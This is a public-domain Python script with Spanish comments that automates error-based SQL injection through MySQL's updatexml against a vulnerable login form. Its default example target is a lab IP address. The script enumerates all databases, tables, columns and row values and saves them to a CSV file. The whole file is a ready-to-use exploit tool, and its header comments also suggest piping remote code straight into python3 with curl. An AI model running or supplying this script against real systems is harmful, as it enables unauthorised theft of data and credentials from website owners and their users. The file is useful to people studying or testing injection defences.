#!/usr/bin/env python3

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para usar error-based SQLi para dumpear una base de datos de una URL específica
#
# Ejecución remota (puede requerir permisos sudo):
#   curl -sL x | python3 -
#
# Ejecución remota como root (para sistemas sin sudo):
#   curl -sL x | sed 's-sudo--g' | python3 -
#
# Ejecución remota sin caché:
#   curl -sL -H 'Cache-Control: no-cache, no-store' x | python3 -
#
# Ejecución remota con parámetros:
#   curl -sL x | python3 - Parámetro1 Parámetro2
#
# Bajar y editar directamente el archivo en nano
#   curl -sL x | nano -
# ----------

# Requisitos: # python3 -m pip install --user x --break-system-packages

import requests
import csv
import argparse
import sys
from urllib.parse import urlparse

# Argumentos CLI
parser = argparse.ArgumentParser(description="MySQL dump via error-based SQLi (updatexml).")
parser.add_argument("--url", required=True, help="URL del login vulnerable (ej: http://10.10.224.12/login)")
parser.add_argument("--max", type=int, default=10, help="Máximo de elementos a enumerar por nivel (default: 10)")
args = parser.parse_args()

url = args.url
max_enum = args.max

headers = {
  "User-Agent": "Mozilla/5.0",
  "Content-Type": "application/x-www-form-urlencoded"
}

def sqli_payload(query):
  return f"' AND updatexml(null,concat(0x7e,({query}),0x7e),null) -- -"

def extract(query):
  try:
    r = requests.post(url, data={"username": sqli_payload(query), "password": "x"}, headers=headers, timeout=5)
    if "XPATH syntax error" in r.text:
      start = r.text.find("~")
      end = r.text.find("~", start + 1)
      if start != -1 and end != -1:
        return r.text[start + 1:end]
  except Exception as e:
    print(f"[!] Error en consulta: {query} -> {e}")
  return None

# Crear archivo CSV
hostname = urlparse(url).hostname.replace(".", "_")
csv_file = f"dump_{hostname}.csv"
csv_output = open(csv_file, "w", newline='', encoding="utf-8")
csv_writer = csv.writer(csv_output)
csv_writer.writerow(["Database", "Table", "RowIndex", "Column", "Value"])  # Cabecera

print("\n [DUMP COMPLETO DE MYSQL]")

for db_i in range(max_enum):
  db = extract(f"SELECT schema_name FROM information_schema.schemata LIMIT {db_i},1")
  if not db:
    break
  print(f"\n [DB] {db}")

  for tb_i in range(max_enum):
    table = extract(f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT {tb_i},1")
    if not table:
      break
    print(f"  [TABLE] {table}")

    # Obtener columnas
    col_list = []
    for col_i in range(max_enum):
      col = extract(f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{db}' LIMIT {col_i},1")
      if not col:
        break
      col_list.append(col)
      print(f"    [COLUMN] {col}")

    # Obtener valores
    for row_i in range(max_enum):
      row_filled = False
      for col in col_list:
        value = extract(f"SELECT {col} FROM {db}.{table} LIMIT {row_i},1")
        if value is None:
          continue
        print(f"      row[{row_i}] {col} = {value}")
        csv_writer.writerow([db, table, row_i, col, value])
        row_filled = True
      if not row_filled:
        break

csv_output.close()
print(f"\n  Dump finalizado. Archivo guardado en: {csv_file}")
